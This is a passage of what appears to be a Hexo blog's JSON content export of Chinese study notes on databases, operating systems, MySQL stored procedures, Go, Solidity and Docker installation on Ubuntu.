班级字段存在冗余，班级名称字段没有直接依赖主键，班级名称字段依赖班级编号，班级编号依赖于学生编号，这就是传递依赖，解决办法就是将冗余字段单独拿出来建立表 经典设计一对一： 一对多：一存储在一张表中，多存储在一张表中，在多的那张表中添加外键指向一的那张表 多对多：","categories":[],"tags":[]},{"title":"操作系统复习-3","slug":"操作系统/操作系统复习-3","date":"2021-06-27T08:27:22.000Z","updated":"2021-06-27T08:54:10.000Z","comments":true,"path":"2021/06/27/操作系统/操作系统复习-3/","link":"","permalink":"http://example.com/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/","excerpt":"","text":"程序装入内存绝对装入、静态重定位（可重定位）地址变换是在装入时一次完成的、动态重定位：把地址推迟到程序真正执行时才进行，装入内存后所有的地址仍然是逻辑地址 内存管理操作系统负责内存空间的分配和回收从逻辑上对内存空间进行扩充1.覆盖技术 2.交换技术 3.虚拟存储技术提供地址转换功能，负责程序的逻辑地址与物理地址的转换 提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰1.设置上下限寄存器 2.利用重定位寄存器、界地址寄存器进行判断","categories":[],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"操作系统复习-2","slug":"操作系统/操作系统复习-2","date":"2021-06-20T07:54:30.000Z","updated":"2021-07-02T02:26:42.000Z","comments":true,"path":"2021/06/20/操作系统/操作系统复习-2/","link":"","permalink":"http://example.com/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/","excerpt":"","text":"进程的概念、组成、特征概念 组成 特征 进程状态与转换 进程控制实现进程状态转换 实现进程控制（原语）原语的原子性原语的执行具有原子性，即执行的过程只能一气呵成，期间不允许被中断。 通过使用“关中断”和“开中断”这两个特权指令实现原子性 进程控制相关的原语进程的创建1.创建原语 申请空白PCB 为新进程分配所需资源 初始化PCB 将PCB插入就绪队列：创建态-&gt;就绪态 2.引起进程创建的事件 用户登录 作业调度 多道批处理系统中，有新的作业放入内存中，会为其创建一个新的进程 提供服务 应用请求 进程的终止1.撤销原语 从PCB集合中找到终止进程的PCB 若进程正在运行，立即剥夺CPU，将CPU分配给其他进程 终止其所有的子进程 将该进程拥有的所有资源归还给父进程或操作系统 删除PCB 2.引起进程终止事件 正常结束(exit 系统调用) 异常结束（除0操作） 外界干预 进程的阻塞和唤醒 进程的切换 线程的概念线程线程是一个基本的CPU执行单元，也是程序执行的最小单位，引入线程后，不仅进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程内也可以并发处理各种任务。进程只作为除CPU之外的系统资源分配单元。 线程的作用 线程的属性 线程的实现方式1.用户级线程（CPU调度单位仍是进程） 2.内核级线程 多线程模型 进程的调度、层次高级调度高级调度：作业调度，按照一定的原则从外存的作业后备队列中挑选一个作业调入内存，并创建进程，每个作业只调入一次，调出一次。作业调入时会建立PCB，调出时才撤销PCB。 低级调度低级调度：进程调度/处理调度，按照某种策略从就绪队列中选取一个进程，将处理机分配给它。 进程调度是操作系统中最基本的一种调度，在一般操作系统中都必须配置进程调度。 中级调度中级调度：内存调度，按照某种策略决定将哪个处于挂起状态的进程重新调入内存 暂时调到外存等待的进程状态为挂起状态，被挂起的进程PCB会被组织成挂起队列 七状态模型 进程调度进程调度，就是按照某种算法从就绪队列中选择一个进程为其分配处理机 调度算法评价指标CPU利用率 系统吞吐量 周转时间 等待时间 响应时间 调度算法先来先服务 短作业优先算法 SJF/SPF 非抢占式 抢占式 高响应比优先算法 时间片轮转 优先级调度算法 多级反馈队列调度算法 进程管理进程同步、互斥 进程互斥 进程互斥实现方法1.单标志 2.双标志先检查 3.双标志后检查 4.peterson算法 5.硬件互斥实现方法 信号量机制 1.整型信号量 2.记录型信号量 信号量机制实现进程互斥 生产者消费者问题主要是两个同步问题和一个互斥问题 多生产者和多消费者问题 缓冲区大小为1，所以不需要互斥访问 读者和写者问题一个写者写文件和多个读者读文件 第一个读者对文件进行加锁，if(count==0)的时候对P(rw)进行加锁，其他读者进来时可以直接跳过P(rw)，而信号量mutex则是为了保证变量count的互斥访问，防止if(count==0)到P(rw)之间进程调度发生时，两个进程发生了死锁。所以需要PV操作对mutex信号量进行操作，最后一个读进程时则需要对文件进行解锁 哲学家进餐问题 管程1.管程的定义和基本特征 2.用管程解决生产者和消费者问题3.JAVA中类似的管程机制 死锁 循环等待不一定导致死锁，死锁一定会导致循环等待 1.预防死锁 2.避免死锁安全序列，指的是系统按照这种序列分配资源，则每个进程都能顺利完成，只要找出一个安全序列，系统就是安全状态，当然，安全序列可能有多个 在资源分配之前预先判断这次分配是否会导致系统进入不安全状态，一次决定是否答应资源分配请求，银行家算法的核心思想 在进程提出资源申请时，先预判此次分配是否会导致系统进入不安全状态，如果会进入不安全状态，就暂时不答应此次请求，让该进程先阻塞等待 3.死锁的检测和解除 解除","categories":[],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"操作系统复习-1","slug":"操作系统/操作系统复习-1","date":"2021-06-20T04:38:41.000Z","updated":"2021-06-20T07:54:16.000Z","comments":true,"path":"2021/06/20/操作系统/操作系统复习-1/","link":"","permalink":"http://example.com/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/","excerpt":"","text":"操作系统的特征并发、共享、虚拟、异步 并发和共享是最基本的特征，两者互为存在条件 并发并发指的是两个或多个事件在同一时间间隔发生，这些事件宏观上是同时发生的，但微观上是交替发生 并行指的是两个或多个事件在同一时刻同时发生 操作系统的并发性指的是计算机系统中”同时“运行多个程序，这些程序宏观上看是同时运行，而微观上看是交替运行的。操作系统就是伴随着”多道程序技术“出现的，操作系统和程序并发是一起诞生的 单核CPU同一个时刻只能执行一个程序，各个程序只能并发地执行 多核CPU用一时刻能执行多个程序，多个程序可以并行地执行 共享共享即资源共享，是指系统中的资源可供内存中多个并发执行的进程共同使用 互斥共享方式 一个时间段一个 同时共享方式（分时共享）一个时间段多个（交替） 虚拟虚拟指的是一个物理上的实体变成若干个逻辑上的对应物。 空分复用技术（虚拟存储器技术） 时分复用技术（虚拟处理器） 如果失去了并发性，则一个时间段内系统中只允许一道程序，那么就失去了实现虚拟性的意义，没有并发性就谈不上虚拟性 异步 只有系统拥有并发性才可能导致异步性 操作系统的发展与分类手工操作阶段单道批处理系统引入脱机输入、输出方式，由监督程序负责控制作业的输入、输出 多道批处理系统 分时操作系统计算机以时间片为单位轮流给各个用户/作业服务，各个用户可通过终端与计算机交互 主要优点：用户的请求可以即时响应，解决了人机交互问题，允许各个用户同时使用一台计算机，并且用户对计算机的操作相互独立，感觉不到别人的存在。 主要缺点：不能优先处理一些紧急任务，操作系统对各个用户、作业都是完全公平，循环地为每个用户、作业服务一个时间片，不缺分任务的紧急性。 实时操作系统 其他操作系统 操作系统运行机制两种指令1.特权指令2.非特权指令两种处理器状态1.核心态、核心态、管态内核态说明此时运行的是内核程序，可以执行特权指令 2.用户态、目态用户态说明此时运行的是应用程序，只能执行非特权指令 CPU中有一个寄存器叫程序状态字寄存器PSW，其中有一个二进制位，1表示内核态，0表示用户态 两种程序1.内核程序2.应用程序内核内核是操作系统最重要核心的部分，由很多内核程序组成操作系统内核 中断和异常 中断类型1.内中断与当前执行的指令有关，中断信号来源于CPU内部 2.外中断与当前执行的指令无关，中断信号来源于CPU外部 中断分类 中断机制的基本原理 系统调用什么是系统调用“系统调用”是操作系统提供给应用程序使用的接口，可以理解为一种可供应用程序调用的特殊函数，应用程序可以通过系统调用来请求获得操作系统内核的服务 系统调用与库函数区别 系统调用的过程 操作系统的内核","categories":[],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://example.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}]},{"title":"Hadoop文件系统配置","slug":"Hadoop文件系统/Hadoop文件系统配置","date":"2021-06-02T08:41:20.000Z","updated":"2021-06-02T09:19:46.000Z","comments":true,"path":"2021/06/02/Hadoop文件系统/Hadoop文件系统配置/","link":"","permalink":"http://example.com/2021/06/02/Hadoop%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/Hadoop%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/","excerpt":"","text":"JAVA环境配置由于Hadoop是基于java编写，所以先配置好java路径的变量 下载 linux配置profile文件","categories":[],"tags":[{"name":"Hadoop","slug":"Hadoop","permalink":"http://example.com/tags/Hadoop/"},{"name":"环境配置","slug":"环境配置","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}]},{"title":"LeetCode-刷题1","slug":"LeetCode/LeetCode-刷题1","date":"2021-06-01T14:39:00.000Z","updated":"2021-06-01T14:40:22.000Z","comments":true,"path":"2021/06/01/LeetCode/LeetCode-刷题1/","link":"","permalink":"http://example.com/2021/06/01/LeetCode/LeetCode-%E5%88%B7%E9%A2%981/","excerpt":"","text":"两数相加","categories":[],"tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://example.com/tags/Leetcode/"},{"name":"算法","slug":"算法","permalink":"http://example.com/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Mysql-存储过程","slug":"数据库/Mysql-存储过程","date":"2021-05-31T07:13:57.000Z","updated":"2021-05-31T13:29:12.000Z","comments":true,"path":"2021/05/31/数据库/Mysql-存储过程/","link":"","permalink":"http://example.com/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/","excerpt":"","text":"存储过程（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。 存储过程是为了完成特定功能的 SQL 语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数（需要时）来调用执行。 类似设定在数据的函数可以设置参数和返回值 游标定义 DECLARE 光标名称 CURSOR FOR 查询语法 打开游标 OPEN 光标名称 取出游标的数据 FETCH 光标名称 INFO var_name [，var_name ]..... 关闭游标 close 光标名称 对一下表的Cno为C1的项的分数+5 12345678910111213141516171819202122232425262728#使用的是loop循环 drop procedure IF EXISTS test4;delimiter $$ CREATE PROCEDURE test4()BEGINDECLARE c_num CHAR(4);DECLARE scores INT;DECLARE done INT DEFAULT FALSE;DECLARE mycursor CURSOR FOR SELECT grade,Cno FROM SC WHERE Cno=(SELECT Cno FROM C WHERE Cname=&#x27;DB&#x27;);DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;OPEN mycursor;read_Loop:LOOP fetch mycursor INTO scores,c_num; #如果游标读不到的数据后 ，激活handler 设置done为true 跳出循环 IF done THEN LEAVE read_Loop; END IF; UPDATE SC SET grade=scores+5 WHERE Cno=c_num AND grade=scores; SELECT scores,c_num;END LOOP read_Loop;close mycursor;End $$delimiter ; 必须注意的是此处采用的是loop循环，loop循环必须跟一个标签一起使用，此时使用的是read_Loop，这里还有一个点需要注意，声明语句必须在执行语句之前，并且应该按照普通变量、游标、句柄的顺序声明 运行前：运行后： 1#带参数的存储过程","categories":[],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://example.com/tags/Mysql/"}]},{"title":"go基本语法","slug":"GO/go基本语法","date":"2021-05-30T07:44:47.000Z","updated":"2021-05-30T13:15:26.000Z","comments":true,"path":"2021/05/30/GO/go基本语法/","link":"","permalink":"http://example.com/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","excerpt":"","text":"指针12345str:=&quot;Test&quot;//指针声明var p *string=&amp;str;fmt.Println(reflect.TypeOf(p))fmt.Println(p) 指针通常在函数传递参数，或者给某个类型定义新的方法时使用。Go 语言中，参数是按值传递的，如果不使用指针，函数内部将会拷贝一份参数的副本，对参数的修改并不会影响到外部变量的值。如果参数使用指针，对参数的传递将会影响到外部变量。 错误处理(error handling)如果函数实现过程中，如果出现不能处理的错误，可以返回给调用者处理。比如我们调用标准库函数os.Open读取文件，os.Open 有2个返回值，第一个是 *File，第二个是 error， 如果调用成功，error 的值是 nil，如果调用失败，例如文件不存在，我们可以通过 error 知道具体的错误信息。 1234_,err := os.Open(&quot;file&quot;)if(err != nil)&#123; fmt.Println(err)&#125; 自定义错误123456789101112131415import ( fmt error)func test_error(name string) error &#123; if len(name)==0&#123; return errors.New(&quot;error name is null &quot;) &#125; fmt.Println(&quot;Hello&quot;,name); return nil&#125;err:=test_error(&quot;&quot;);if err!=nil&#123; fmt.Println(err); &#125; 异常处理Go 语言也提供了类似的机制 defer 和 recover 1234567891011121314151617181920func get(index int) (ret int) &#123; defer func() &#123; //defer函数内定义了异常处理函数 在函数退出前 //会执行defer的内容,若是发生了错误直接将控制权 //交给此函数，在defer的处理逻辑中 //使用recover( )使程序恢复正常 println(&quot;执行defer&quot;) r := recover() if r != nil &#123; //正常执行 是不会执行recover() 此时的r==nil fmt.Println(&quot;Some error happened!&quot;, r) ret = -1 &#125; &#125;() arr := [3]int&#123;2, 3, 4&#125; return arr[index]&#125;fmt.Println(get(0));fmt.Println(get(3)); 结构体，方法和接口12345678910type 结构体名 struct&#123; 属性名 类型 属性名 类型 ···&#125;func (实例名 *结构体名)方法名(函数参数)函数返回值&#123; ···&#125; 123456789101112131415161718192021222324252627282930313233//使用 Student&#123;field: value, ...&#125;的形式创建 Student 的实例type Student struct &#123; name string age int sex byte&#125;//创建该结构体的方法func (stu *Student) hello(person string) string &#123; return fmt.Sprintf(&quot;hello %s,I am %s,my sex is %c&quot;,person,stu.name,stu.sex)&#125;func main()&#123; //实例化结构 stu_first:=Student&#123; name:&quot;we&quot;, sex:&#x27;f&#x27;, &#125; //实例化结构体指针 可以通过stu.name直接返回属性 stu:=&amp;Student&#123; name:&quot;Tom&quot;, sex:&#x27;m&#x27;, &#125; fmt.Println(reflect.TypeOf(stu_first)) msg:=stu.hello(&quot;cia&quot;) fmt.Println(msg) fmt.Println(reflect.TypeOf(stu)) //直接使用new实例 实例完返回结构体的指针 stu:=new(Student) stu.name=&quot;caixukun&quot; fmt.Println(reflect.TypeOf(stu)) fmt.Println(stu.hello(&quot;123&quot;))&#125; 实现方法与实现函数的区别在于，func 和函数名hello 之间，加上该方法对应的实例名 stu 及其类型 *Student，可以通过实例名访问该实例的字段name和其他方法了。 调用方法通过 实例名.方法名(参数) 的方式。 可以直接使用new进行实例 1234567891011121314151617181920212223242526272829303132333435363738394041424344//接口type Person interface &#123; getName() string &#125;type Student struct &#123; name string age int sex byte&#125;func (stu *Student) getName() string &#123; return stu.name &#125;func main()&#123; //检测接口是否已经全部被重写 var _ Person = (*Student)(nil) var _ Person = (*Worker)(nil)//将空值 nil 转换为 *Work 类型，再转换为 Person 接口，如果转换失败，说明接口还没全部重写 //将Student实例类型转为Person var p Person = &amp;Student&#123; name: &quot;caixukun&quot;, age: 18, sex:&#x27;m&#x27;, &#125; fmt.Println(p.getName()) // caixukun fmt.Println(reflect.TypeOf(p)) //fmt.Println(p.name) //报错 p.name undefined (type Person has no field or method name) //接口强制类型转位实例 stu:=p.(*Student) print(stu.name) &#125;//空接口//如果定义了一个没有任何方法的空接口，那么这个接口可以表示任意类型。例如func main() &#123; m := make(map[string]interface&#123;&#125;) m[&quot;name&quot;] = &quot;Tom&quot; m[&quot;age&quot;] = 18 m[&quot;scores&quot;] = [3]int&#123;98, 99, 85&#125; fmt.Println(m) // map[age:18 name:Tom scores:[98 99 85]]&#125; 并发编程Go 语言提供了 sync 和 channel 两种方式支持协程(goroutine)的并发。 例如我们希望并发下载 N 个资源，多个并发协程之间不需要通信，那么就可以使用 sync.WaitGroup，等待所有并发协程执行结束。 1234567891011121314151617181920212223//通过使用sync.WaitGroup进行并发package mainimport ( &quot;fmt&quot; &quot;sync&quot; &quot;time&quot;)var wg sync.WaitGroupfunc download(url string) &#123; fmt.Println(&quot;start to download&quot;, url) time.Sleep(time.Second) // 模拟耗时操作 wg.Done() //完成任务减去一个计数&#125;func main()&#123; for i := 0; i &lt; 3; i++ &#123; wg.Add(1) //为wg添加一个计数 加入一个线程 go download(&quot;a.com/&quot; + string(i+&#x27;0&#x27;)) //启动新的线程并发执行该函数 &#125; wg.Wait() //等待所有线程结束 fmt.Println(&quot;Done!&quot;)&#125; 1234567891011121314151617181920212223//使用channel进行package mainimport ( &quot;fmt&quot; &quot;time&quot;)var ch = make(chan string, 10) // 创建大小为 10 的缓冲信道func download(url string) &#123; fmt.Println(&quot;start to download&quot;, url) time.Sleep(time.Second) // 模拟耗时操作 ch &lt;- url // 将 url 发送给信道&#125;func main()&#123; for i := 0; i &lt; 3; i++ &#123; go download(&quot;a.com/&quot; + string(i+&#x27;0&#x27;)) //启动新的线程并发执行该函数 &#125; for i := 0; i &lt; 3; i++ &#123; msg := &lt;-ch // 等待信道返回消息。 fmt.Println(&quot;finish&quot;, msg) &#125; fmt.Println(&quot;Done!&quot;)&#125; 包和模块go 1.16版本之前，go build, go test以及其他包构建命令 自动查找并下载依赖包并将依赖添加到go.mod中，go 1.16及其以后，go command不再自动下载不在go.mod中的依赖，而是需要通过go get 命令手动下载 go init example 123456//calc.gopackage calc//导入函数的声明必须大写开头func Add(num1 int, num2 int) int &#123; return num1 + num2&#125; 1234567891011package mainimport ( &quot;fmt&quot; &quot;rsc.io/quote&quot; &quot;example/calc&quot;)func main() &#123; fmt.Println(quote.Hello()) fmt.Println(calc.Add(10,3))&#125; 由于版本是go1.16 已经不支持自动下载包，手动下载命令 go get rsc.io/quote 文件结构： 运行结果：","categories":[],"tags":[{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"语言基础","slug":"语言基础","permalink":"http://example.com/tags/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"}]},{"title":"Mysql-并发控制","slug":"数据库/Mysql-并发控制","date":"2021-05-18T04:45:12.000Z","updated":"2021-05-18T05:52:00.000Z","comments":true,"path":"2021/05/18/数据库/Mysql-并发控制/","link":"","permalink":"http://example.com/2021/05/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6/","excerpt":"","text":"Mysql存储引擎MySQL最常用引擎：MyISAM和InnoDB，在MySQL 5.5.5以前，默认的存储引擎为MyISAM，之后版本默认为InnoDB。InnoDB对事物完整性更好以及有更高的并发性，下面了解一下他们之间的区别： 对比项 MyISAM InnoDB 主外键 不支持 支持 事务 不支持 支持 行表锁 锁。操作一条记录也会锁住整个表 行锁。操作时只锁某一行 缓存 只缓存索引，不缓存真实数据 不仅缓存索引，还缓存真实数据 表空间 小 大 关注点 性能 事务 默认安装 是 是 锁机制锁的主要作用是管理共享资源的并发访问，锁可以用于实现事务的隔离。 锁的分类1.操作类型区分（读/写）分类： 共享锁（读锁） 排它锁（写锁） 2.对数据操作的粒度区分： 表锁 行锁","categories":[],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"GO语言开发配置","slug":"GO/GO语言开发配置","date":"2021-04-29T06:58:05.000Z","updated":"2021-05-02T13:51:22.000Z","comments":true,"path":"2021/04/29/GO/GO语言开发配置/","link":"","permalink":"http://example.com/2021/04/29/GO/GO%E8%AF%AD%E8%A8%80%E5%BC%80%E5%8F%91%E9%85%8D%E7%BD%AE/","excerpt":"","text":"环境配置基础语法变量声明:=语法是声明和初始化变量的简写形式 var f string =“short” f := &quot;short&quot; 循环体123456789101112131415161718192021222324252627282930313233343536373839// `for` is Go&#x27;s only looping construct. Here are// three basic types of `for` loops.package mainimport &quot;fmt&quot;func main() &#123; // The most basic type, with a single condition. i := 1 for i &lt;= 3 &#123; fmt.Println(i) i = i + 1 &#125; // A classic initial/condition/after `for` loop. for j := 7; j &lt;= 9; j++ &#123; fmt.Println(j) &#125; // `for` without a condition will loop repeatedly // until you `break` out of the loop or `return` from // the enclosing function. for &#123; fmt.Println(&quot;loop&quot;) break &#125; // You can also `continue` to the next iteration of // the loop. for n := 0; n &lt;= 5; n++ &#123; if n%2 == 0 &#123; continue &#125; fmt.Println(n) &#125;&#125; 切片slice[low,high]左闭右开区间迭代数组或者切片12345678910111213141516171819//for 索引,值 :=range(切片/数组)slice_nums:=make([]int,5)for i:=0;i&lt;len(slice_nums);i++&#123; slice_nums[i]=i+10;&#125;fmt.Println(&quot;打印切片&quot;,slice_nums)//迭代切片for i,value:=range slice_nums&#123; fmt.Println(&quot;索引&quot;,i,&quot;值&quot;,value)&#125;arr_nums:=[]int&#123;1,2,3,4,5&#125;;// for i:=0;i&lt;len(arr_nums);i++&#123;// arr_nums[i]=i;// &#125;fmt.Println(&quot;打印数组&quot;,arr_nums)for i,value:=range arr_nums&#123; fmt.Println(&quot;索引&quot;,i,&quot;值&quot;,value)&#125; 运行结果 函数定义12345678910111213函数原型func 函数名(参数名 参数类型，参数名 参数类型，···)返回值类型&#123;···&#125;多返回值类型func 函数名(参数名 参数类型，参数名 参数类型，···)(返回值类型,返回值类型,···)&#123;···&#125;可变参数类型func 函数名(slice/array数组名 ...参数类型)&#123; for 索引,值 := range slice/array数组名&#123; &#125;&#125; 123func add(a,b)int&#123; return a+b;&#125; 123456//可变参数类型例子 传入一数组名称 ...func add(a...int)int&#123; fmt.Println(a) return 1;&#125;add(a...) 匿名函数定义12345函数原型func 外层函数名 func() 匿名函数返回值&#123; return func() 返回值&#123; &#125;&#125; 12345678910111213141516func intSeq() func() int &#123; //返回值 返回一个函数该函数的返回值为整型 a:=0 fmt.Println(&quot;初始化···&quot;) return func() int &#123; a+=1 return a &#125;&#125;func main() &#123; a:=intSeq() fmt.Println(a()) fmt.Println(a()) fmt.Println(a())&#125; 运行截图 匿名函数将地址赋值给intSeq( )，然后每调用一次，调用地址对应的匿名函数 函数递归","categories":[{"name":"语言基础","slug":"语言基础","permalink":"http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"name":"环境配置","slug":"语言基础/环境配置","permalink":"http://example.com/categories/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"}],"tags":[{"name":"GO","slug":"GO","permalink":"http://example.com/tags/GO/"}]},{"title":"Solidity语言基础","slug":"区块链/Solidity语言基础","date":"2021-04-10T06:59:48.000Z","updated":"2021-04-11T03:50:52.000Z","comments":true,"path":"2021/04/10/区块链/Solidity语言基础/","link":"","permalink":"http://example.com/2021/04/10/%E5%8C%BA%E5%9D%97%E9%93%BE/Solidity%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/","excerpt":"","text":"类型函数类型1function (&lt;parameter types&gt;) &#123;internal|external&#125; [pure|constant|view|payable] [returns (&lt;return types&gt;)] 与参数类型相反，返回类型不能为空 —— 如果函数类型不需要返回，则需要删除整个 returns (&lt;return types&gt;) 部分。 返回变量 123456789101112131415161718pragma solidity &gt;=0.4.16 &lt;0.9.0;contract Simple &#123; function arithmetic(uint _a, uint _b) public pure returns (uint o_sum, uint o_product) &#123; o_sum = _a + _b; o_product = _a * _b; &#125; function arithmetic(uint _a, uint _b) public pure returns (uint o_sum, uint o_product) &#123; return (_a + _b, _a * _b); &#125;&#125; 两个返回方式相同，返回多个变量用(a,b····) View视图函数：保证不修改状态 下面的语句被认为是修改状态： 修改状态变量。 产生事件。 创建其它合约。 使用 selfdestruct。 通过调用发送以太币。 调用任何没有标记为 view 或者 pure 的函数。 使用低级调用。 使用包含特定操作码的内联汇编。 Pure纯函数 函数可以声明为 pure ，在这种情况下，承诺不读取也不修改状态。 除了上面解释的状态修改语句列表之外，以下被认为是读取状态： 读取状态变量。 访问 address(this).balance 或者 &lt;address&gt;.balance。 访问 block，tx， msg 中任意成员 （除 msg.sig 和 msg.data 之外）。 调用任何未标记为 pure 的函数。 使用包含某些操作码的内联汇编。 receive接受一台函数 Fallback回退函数 地址类型Addressaddress：保存一个20字节的值（地址的大小） address payable ：可支付地址，与 address 相同，不过有成员函数 transfer 和 send 可见性和getter函数由于 Solidity 有两种函数调用（内部调用不会产生实际的 EVM 调用或称为“消息调用”，而外部调用则会产生一个 EVM 调用）， 函数和状态变量有四种可见性类型。 函数可以指定为 external ，public ，internal 或者 private。 对于状态变量，不能设置为 external ，默认是 internal 。 getter函数编译器自动为所有 public 状态变量创建 getter 函数 12345678910pragma solidity &gt;=0.4.16 &lt;0.9.0;contract C &#123; uint public data = 42;&#125;contract Caller &#123; C c = new C(); function f() public &#123; uint local = c.data(); &#125;&#125; 对于Caller合约，编译器会生成一个data的函数，该函数没有参数，返回值是一个uint类型，即状态变量data的值，getter 函数具有外部（external）可见性。 数组一个元素类型为 T，固定长度为 k 的数组可以声明为 T[k]，而动态数组声明为 T[] 举个例子，一个长度为 5，元素类型为 uint 的动态数组的数组（二维数组），应声明为 uint[][5] （注意这里跟其它语言比，数组长度的声明位置是反的）。 函数修饰器使用 修改器modifier 可以轻松改变函数的行为 修改器modifier 是合约的可继承属性，并可能被派生合约覆盖 , 但前提是它们被标记为 virtual. 投票例子数据结构 123456789101112131415161718//表示一个选民struct Voter &#123; uint weight; // 计票的权重 bool voted; // 若为真，代表该人已投票 address delegate; // 被委托人 uint vote; // 投票提案的索引&#125;// 提案的类型struct Proposal &#123; string name; // 简称（最长32个字节） uint voteCount; // 得票数&#125;//提案人address public chairperson;//投票者的map图mapping(address =&gt; Voter) public voters;//提案数组Proposal[] public proposals","categories":[],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://example.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]},{"title":"Linux-Docker安装以及使用","slug":"Linux/Linux-Docker安装以及使用","date":"2021-04-05T04:31:59.000Z","updated":"2021-04-05T07:51:30.000Z","comments":true,"path":"2021/04/05/Linux/Linux-Docker安装以及使用/","link":"","permalink":"http://example.com/2021/04/05/Linux/Linux-Docker%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/","excerpt":"","text":"docker是什么Docker是一个开放源代码软件项目，让应用程序布署在软件容器下的工作可以自动化进行，借此在Linux操作系统上，提供一个额外的软件抽象层，以及操作系统层虚拟化的自动管理机制。Docker利用Linux核心中的资源分离机制，例如cgroups，以及Linux核心命名空间（name space），来建立独立的软件容器（containers）。这可以在单一Linux实体下运作，避免启动一个虚拟机器造成的额外负担。 安装（Ubuntu）更新apt软件包索引并安装软件包以允许apt通过HTTPS使用存储库：大多数用户会 设置Docker的存储库并从中进行安装，以简化安装和升级任务。这是推荐的方法 1234567sudo apt-get updatesudo apt-get install \\ apt-transport-https \\ ca-certificates \\ curl \\ gnupg \\ lsb-release 添加官方的GPG密钥1curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg 使用以下命令来设置稳定的存储库。要添加 夜间或测试存储库，请在下面的命令中在单词后面添加nightly或test（或两者）stable。123echo \\ &quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \\ $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null 安装Docker引擎12sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.io 运行helloword测试是否安装成功 Registry——镜像仓库 Docker Hub 是Docker官方的镜像站，类似Github一般的存在，注册后我们也可以往上面上传镜像 registry 是存放和分发Docker镜像的一个服务 Docker hub 可以类比为 Github，是一个公共的镜像服务中心 搭建 Registry 可以类比为搭建 GitLab 服务器，是一个私有的镜像服务中心 自建 Registry 可以让镜像私有化，也可以提高镜像拉取速度 基础容器操作https://blog.csdn.net/zhangjiaweizk/article/details/108605185 查看运行的容器CONTAINER ID:容器ID IMAGE:使用镜像 COMMAND:启用镜像使用命令 STATUS:容器状态 12345678910111213141516dokcer ps-a：显示所有的容器，包括未运行的。-f：根据条件过滤现实的内容。–format：指定返回值的模板文件。-l：显示最近创建的容器。-n：列出最近创建的n个容器。–no-trunc：不截断输出。-q：静默模式，只显示容器编号。-s：显示总的文件大小。 容器运行123456789101112131415161718192021222324252627282930313233343536docker run-a stdin : 制定标准输入输出内容类型，可选STDIN/STDOUT/STDERR三项；-d ：后台运行容器，并返回容器ID；-i：以交互式运行容器，通常与-t同时使用；-P：随机端口映射，容器内部端口随机映射到主机的端口-p：指定端口映射，格式为:主机（宿主）端口：容器端口-t：为容器重新分配一个伪输入终端，通常与-i同时使用；–name=“nginx-lb”：为容器指定一个名称；–dns 8.8.8.8：指定容器使用的DNS服务器，默认和宿主一致；–dns-search example.com：指定容器DNS搜索域名，默认和宿主一致；-h “mars&quot;：指定容器的hostname；-e username=“ritchie”：设置环境变量；–env-file=[]：从指定文件读入环境变量；–cpuset=”0-2“ or --cpuset=“0,1,2”：绑定容器到指定CPU运行；-m：设置容器使用内存最大值；–net=“bridge”：指定容器的网络链接类型，支持bridge/host/none/container 四种类型；–link=[]：添加链接到另一个容器；–expose=[]：开放一个端口或一组端口；–volume ，-v：绑定一个卷 docker start/stop/restartdocker start ：启动一个或多个已经被停止的容器 docker stop：停止一个运行的容器 docker restart：重启容器 docker killdocker kill：杀掉一个运行中的容器 docker rmdocker rm：删除一个或多个容器。 